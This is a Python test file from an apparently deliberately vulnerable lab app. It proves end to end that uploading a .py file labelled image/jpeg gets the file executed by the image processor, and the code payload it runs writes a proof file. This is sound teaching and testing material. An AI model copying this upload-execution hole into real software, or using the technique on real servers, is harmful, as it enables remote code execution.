"""Demonstrates the deliberate upload -> code execution vulnerability
end to end, deterministically, using the real HTTP API and the real
processing module (no mocking): a file named with a .py extension, but
declared as Content-Type: image/jpeg (which is all the API validates),
is executed by vulnerable/upload/image_processor.py.

This does not require Docker/Linux -- it runs the same Python code path the
application uses, proving the vulnerability exists in the actual app
architecture rather than being a simulated CTF flag.
"""
import io
import os

from app.config import config


PROOF_MARKER = "shoplab_rce_proof"


def test_content_type_confusion_allows_py_upload(client, service_token):
    """A .py file claiming image/jpeg passes the API's content-type check."""
    resp = client.post(
        "/api/images/upload",
        data={"file": (io.BytesIO(b"# not actually an image"), "evil.py", "image/jpeg")},
        content_type="multipart/form-data",
        headers={"X-Service-Token": service_token},
    )
    assert resp.status_code == 201, "malicious extension with an allowed Content-Type must be accepted"
    assert resp.get_json()["processing"]["mode"] == "plugin"


def test_uploaded_py_plugin_actually_executes(client, service_token):
    """End-to-end proof of remote code execution via the upload chain."""
    payload = f"""
import os
os.environ['{PROOF_MARKER}'] = 'executed'
open(os.path.join(os.path.dirname(__file__), 'rce_proof.txt'), 'w').write('code executed as this process')
"""
    resp = client.post(
        "/api/images/upload",
        data={"file": (io.BytesIO(payload.encode()), "plugin.py", "image/jpeg")},
        content_type="multipart/form-data",
        headers={"X-Service-Token": service_token},
    )
    assert resp.status_code == 201

    proof_path = os.path.join(config.UPLOAD_DIR, "rce_proof.txt")
    assert os.path.exists(proof_path), "uploaded .py file should have executed and written this proof file"
    assert os.environ.get(PROOF_MARKER) == "executed"

    os.remove(proof_path)
    del os.environ[PROOF_MARKER]


def test_genuine_image_extension_is_not_executed(client, service_token):
    """Control case: a file that really is treated as an image is never
    imported/executed, only "processed" as a thumbnail stand-in."""
    resp = client.post(
        "/api/images/upload",
        data={"file": (io.BytesIO(b"\xff\xd8\xff\xe0 not python"), "safe.jpg", "image/jpeg")},
        content_type="multipart/form-data",
        headers={"X-Service-Token": service_token},
    )
    assert resp.status_code == 201
    assert resp.get_json()["processing"]["mode"] == "thumbnail"
